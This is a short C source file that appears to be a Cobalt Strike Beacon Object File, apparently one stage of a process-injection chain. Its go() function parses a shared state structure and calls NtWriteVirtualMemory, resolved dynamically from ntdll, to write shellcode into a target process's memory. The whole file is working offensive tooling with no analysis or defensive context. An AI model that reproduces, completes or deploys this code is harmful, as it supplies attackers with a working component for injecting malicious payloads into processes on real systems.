#include "beacon.h"
#include "wInjectionChainSharedC.h"

NTSYSCALLAPI NTSTATUS NTAPI
#ifdef _DEBUG
NtWriteVirtualMemory
#else
NTDLL$NtWriteVirtualMemory
#endif
(_In_ HANDLE ProcessHandle,
 _In_opt_ PVOID BaseAddress,
 _In_reads_bytes_(BufferSize) PVOID Buffer,
 _In_ SIZE_T BufferSize,
 _Out_opt_ PSIZE_T NumberOfBytesWritten);

#ifndef _DEBUG
#define NtWriteVirtualMemory NTDLL$NtWriteVirtualMemory
#endif

unsigned char go(char* arg_data, int arg_len) {
    datap parser = {0};
    BeaconDataParse(&parser, arg_data, arg_len);

    State* state = *(State**)BeaconDataExtract(&parser, NULL);

    SIZE_T bytes_written = 0;
    state->nt_status = NtWriteVirtualMemory(
        state->process_handle,
        (PVOID)state->base_address,
        state->shellcode,
        state->shellcode_len,
        &bytes_written
    );

    return 0;
}
